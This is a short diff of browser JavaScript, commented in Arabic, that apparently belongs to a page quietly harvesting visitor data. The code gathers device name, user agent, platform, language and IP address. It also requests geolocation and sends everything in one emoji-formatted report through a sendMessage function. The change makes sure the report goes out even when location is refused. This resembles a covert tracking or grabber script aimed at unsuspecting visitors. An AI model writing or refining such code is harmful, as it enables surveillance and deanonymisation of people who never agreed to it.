@@ -129,7 +129,7 @@
 
           // معلومات الجهاز
           message += `\n📱 Device Information 📱:\n`;
-          message += `- Device Name: ${getDeviceName()}\n`; // محاولة الحصول على اسم الجهاز
+          message += `- Device Name: ${getDeviceName()}\n`; 
           message += `- User Agent: ${navigator.userAgent}\n`;
           message += `- Platform: ${navigator.platform}\n`;
           message += `- 🗣 Language: ${navigator.language}\n`;
@@ -151,18 +151,21 @@
             message += `\n🌐 IP: ${ipData.ip}`;
           }
 
-          sendMessage(message); // إرسال معلومات الجهاز أولاً
-
           // الحصول على الموقع (يطلب إذن)
           if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
               const latitude = position.coords.latitude;
               const longitude = position.coords.longitude;
               const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-              sendMessage(`📍 Location: ${googleMapsLink}`); // إرسال الموقع إذا تم منح الإذن
+              message += `\n📍 Location: ${googleMapsLink}`;
+              sendMessage(message); // إرسال الرسالة مع رابط الموقع
             }, function(error) {
-              console.error('Error getting location:', error);
+              message += `\n📍 Location: Not Allowed`;
+              sendMessage(message); // إرسال الرسالة بدون رابط الموقع
             });
+          } else {
+            message += `\n📍 Location: Not Supported`;
+            sendMessage(message); // إرسال الرسالة بدون رابط الموقع
           }
 
         } catch (err) {
